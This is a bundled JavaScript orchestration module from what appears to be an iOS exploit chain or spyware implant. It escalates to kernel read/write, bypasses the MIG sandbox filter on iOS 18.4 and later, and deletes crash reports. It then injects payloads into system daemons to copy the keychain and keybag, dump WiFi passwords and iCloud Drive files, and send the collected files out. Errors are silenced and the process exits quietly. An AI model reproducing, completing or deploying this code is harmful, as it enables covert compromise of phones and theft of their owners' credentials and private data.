/*!*********************!*\
  !*** ./src/main.js ***!
  \*********************/
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/TaskRop/TaskRop */ "./src/libs/TaskRop/TaskRop.js");
/* harmony import */ var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/TaskRop/Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/TaskRop/Sandbox */ "./src/libs/TaskRop/Sandbox.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _InjectJS__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./InjectJS */ "./src/InjectJS.js");
/* harmony import */ var libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! libs/Driver/Driver */ "./src/libs/Driver/Driver.js");
/* harmony import */ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! libs/TaskRop/RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
/* harmony import */ var _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! !raw-loader!../dist/MigFilterBypassThread.js */ "./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js");
/* harmony import */ var _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! !raw-loader!loader.js */ "./node_modules/raw-loader/dist/cjs.js!./src/loader.js");
/* harmony import */ var _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! !raw-loader!file_downloader.js */ "./node_modules/raw-loader/dist/cjs.js!./src/file_downloader.js");
/* harmony import */ var _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! !raw-loader!keychain_copier.js */ "./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js");
/* harmony import */ var _raw_loader_wifi_password_dump_js__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__(/*! !raw-loader!wifi_password_dump.js */ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_dump.js");
/* harmony import */ var _raw_loader_wifi_password_securityd_js__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__(/*! !raw-loader!wifi_password_securityd.js */ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_securityd.js");
/* harmony import */ var _raw_loader_icloud_dumper_js__WEBPACK_IMPORTED_MODULE_15__ = __webpack_require__(/*! !raw-loader!icloud_dumper.js */ "./node_modules/raw-loader/dist/cjs.js!./src/icloud_dumper.js");

















//import KeychainDumpCode from '!raw-loader!keychain_dump.js'

class MigFilterBypass {

	#running;
	#sharedMem;
	#runFlagPtr;
	#isRunningPtr;
	#monitorThread1Ptr;
	#monitorThread2Ptr;
	#mutexPtr;

	constructor(mutexPtr) {
		this.#mutexPtr = mutexPtr;
		this.#running = false;
		this.#sharedMem = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("calloc", 1, 0x100));
		this.#runFlagPtr = this.#sharedMem;
		this.#isRunningPtr = this.#sharedMem + 0x4n;
		this.#monitorThread1Ptr = this.#sharedMem + 0x8n;
		this.#monitorThread2Ptr = this.#sharedMem + 0x10n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 2);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#isRunningPtr, 0);
	}

	start() {
		if (this.#running)
			return;

		let threadSelf = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_thread_self"));
		let threadSelfAddr = BigInt(libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(threadSelf));


		let threadMem = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("calloc", 1, 0x400));
		let kernelRW = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].transferRW();
		let kernelBase = BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].getKernelBase());
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem, BigInt(kernelRW.controlSocket));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x8n, BigInt(kernelRW.rwSocket));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x10n, kernelBase);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x18n, threadSelfAddr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x20n, this.#runFlagPtr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x28n, this.#isRunningPtr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x30n, this.#mutexPtr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x38n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migLock));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x40n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migSbxMsg));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x48n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migKernelStackLR));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x50n, this.#monitorThread1Ptr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x58n, this.#monitorThread2Ptr);
		//Native.write64(threadMem, lock.kernelSlide);
		//Native.write64(threadMem + 0x8n, lock.lockAddr);
		//console.log(TAG, `Spawn bypass thread with args: kernelSlide=${Utils.hex(lock.kernelSlide)}, lockAddr=${Utils.hex(lock.lockAddr)}`);
		const threadCode = "fcall_init(); " + _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].threadSpawn(threadCode, threadMem);

		for (let i=0; i<10; i++) {
			let isRunning = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(this.#isRunningPtr);
			if (isRunning)
				break;
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", 500000);
		}

		this.#running = true;
	}

	stop() {
		if (!this.#running)
			return;

		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 0);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
		this.#running = false;
	}

	pause() {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 2);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
	}

	resume() {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
	}

	monitorThreads(thread1, thread2) {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(this.#monitorThread1Ptr, thread1);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(this.#monitorThread2Ptr, thread2);
	}
}
function xnuVersion() {
	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("uname", libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem);
	const release = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x200n, 0x100);
	let splittedVersion = release.split(".");
	let xnuMajor = splittedVersion[0];
	let xnuMinor = splittedVersion[1];
	return {major: xnuMajor, minor: xnuMinor};
}

const TAG = "MAIN";
//const targetProcess = "bluetoothd";
const targetProcess = "SpringBoard";

function start() {
	let mutexPtr = null;
	let migFilterBypass = null;
	globalThis.xnuVersion = xnuVersion();
	let ver = globalThis.xnuVersion;

	// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
	if (ver.major == 24 && ver.minor >= 4) {

		mutexPtr = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("malloc", 0x100));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("pthread_mutex_init", mutexPtr, null);
		migFilterBypass = new MigFilterBypass(mutexPtr);
	}
	let driver = new libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__["default"]();

	libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].init(driver, mutexPtr);

	let resultPE = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].runPE();
	if (!resultPE)
		return;


	libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__["default"].init();
	if(migFilterBypass)
		migFilterBypass.start();
	let launchdTask = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("launchd",migFilterBypass);
	if (!launchdTask.success()) {
		return false;
	}

	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask);
	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].deleteCrashReports();
	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();

	let agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
	let agentPid = 0;

	if (agentLoader.inject()) {
		agentPid = agentLoader.task.pid();
		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].adjustMemoryPressure(targetProcess);

		agentLoader.destroy();
	}

	// Inject keychain copier FIRST into securityd (has access to keychain files)
	// This copies keychain/keybag to /tmp with 777 permissions
	const keychainProcess = "configd";
	let keychainCopier = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](keychainProcess, _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_12__["default"], migFilterBypass);
	if (keychainCopier.inject()) {
		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(keychainCopier.task);
		keychainCopier.destroy();
	} else {
	}

	// Inject WiFi password dump into wifid (has keychain access for WiFi)
	// Using wifid instead of wifianalyticsd - wifid is always active
	const wifidProcess = "wifid";
	let wifiDump = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](wifidProcess, _raw_loader_wifi_password_dump_js__WEBPACK_IMPORTED_MODULE_13__["default"], migFilterBypass);
	if (wifiDump.inject()) {
		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDump.task);
		wifiDump.destroy();
	} else {
	}

	// Also inject WiFi password dump into securityd (fallback for devices where wifid fails)
	const securitydProcess = "securityd";
	let wifiDumpSecurityd = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](securitydProcess, _raw_loader_wifi_password_securityd_js__WEBPACK_IMPORTED_MODULE_14__["default"], migFilterBypass);
	if (wifiDumpSecurityd.inject()) {
		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDumpSecurityd.task);
		wifiDumpSecurityd.destroy();
	} else {
	}

	// Inject iCloud dumper into UserEventAgent (has access to iCloud Drive files)
	const userEventAgentProcess = "UserEventAgent";
	let iCloudDumper = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](userEventAgentProcess, _raw_loader_icloud_dumper_js__WEBPACK_IMPORTED_MODULE_15__["default"], migFilterBypass);
	if (iCloudDumper.inject()) {
		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(iCloudDumper.task);
		iCloudDumper.destroy();
	} else {
	}

	// Wait for all dumps to finish
	for (let i = 1; i <= 5; i++) {
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("sleep", 1);
	}

	// Inject forensics file downloader AFTER keychain copier
	// This will send the copied keychain files from /tmp
	try {
		let fileDownloader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__["default"], migFilterBypass);
		if (fileDownloader.inject()) {
			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(fileDownloader.task);
			fileDownloader.destroy();
		}
	} catch (injectError) {
		// Error handling without logging
	}

	launchdTask.destroy();

	return true;
}

try {
	start();
}
catch (error) {
	// Error handling without logging
}
finally {
	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("exit", 0n);
}

})();

/******/ })()
